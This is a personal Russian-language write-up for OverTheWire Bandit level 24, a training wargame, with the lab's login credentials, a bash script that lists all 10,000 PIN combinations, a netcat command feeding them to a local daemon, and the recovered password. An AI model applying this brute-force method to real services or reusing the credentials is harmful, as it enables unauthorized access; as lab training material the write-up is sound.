---
tags:
  - ctf
created: 2026-03-21
---

# `Level [24]` 
> С помощью брутфорса узнать пинкод, чтобы получить пароль

## 🔐 Учётные данные
| Параметр | Значение                         |
| -------- | -------------------------------- |
| Host     | bandit.labs.overthewire.org      |
| Port     | 2220                             |
| Login    | bandit24                         |
| Password | gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 |

## 🎯 Цель уровня
- Забрутфорсить пинкод

## 📚 Ключевые команды/Техники
| Команда | Описание |
| ------- | -------- |
|         |          |
|         |          |
|         |          |

## 💡 Пошаговое решение
| Шаг | Действие                                                              | Команда/Код                                        |
| --- | --------------------------------------------------------------------- | -------------------------------------------------- |
| 1   | пишем скрипт, который выдаст всевозможные комбинации пароля и пинкода | (ниже)                                             |
| 2   | скармливаем пароли демону и результаты в файл                         | cat codes.txt \| nc 127.0.0.1 30002 >> results.txt |
| 3   | выбираем из результатов уникальный с паролем                          | cat results.txt \| uniq                            |
|     |                                                                       |                                                    |
|     |                                                                       |                                                    |

## 🔍 Результат
Флаг/Пароль:  iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

## 🚪 Переход
-> [Level_24]

## 🔗 Ссылки
- [Название ресурса](URL)
## Scripts

( 
#!/bin/bash


password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
pin=0
#error="Wrong! Please enter the correct current password and pincode. Try again."

#printf "%s %04d\n" "$password" $pin

while [ $pin -le 9999 ] ; do
#    read -r check
       printf "%s %04d\n" "$password" $pin >> codes.txt
        ((pin++))
done
)